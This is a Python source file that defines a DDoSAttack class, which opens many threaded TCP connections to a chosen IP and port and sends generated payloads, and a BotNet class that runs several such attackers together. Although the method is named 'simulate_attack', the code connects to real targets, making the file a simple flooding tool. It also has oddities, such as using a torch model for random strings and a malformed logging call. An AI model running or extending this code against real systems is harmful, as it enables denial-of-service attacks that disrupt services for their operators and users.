import torch
import torch.nn as nn
import socket
import threading
from .random_string_generator import RandomStringGenerator
import logging

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(self, target_ip, target_port, num_connections):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.threads = []
        self.model = RandomStringGenerator(100)

    def simulate_attack(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.create_connection)
            self.threads.append(thread)
            thread.start()

    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            payload = self.model(torch.tensor([])).encode()  # Generate payload
            sock.send(payload)
            logging.info(f"Payload sent:", payload)
            sock.send(b"QUIT")
            sock.close()
        except Exception as e:
            logging.error(f"Exception occurred while creating a connection: {e}")

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


class BotNet:
    def __init__(self, num_bots, target_ip, target_port, num_connections):
        self.num_bots = num_bots
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.bots = []

    def create_bots(self):
        for _ in range(self.num_bots):
            bot = DDoSAttack(self.target_ip, self.target_port, self.num_connections)
            self.bots.append(bot)

    def launch_attack(self):
        for bot in self.bots:
            bot.simulate_attack()
        for bot in self.bots:
            bot.wait_for_threads()
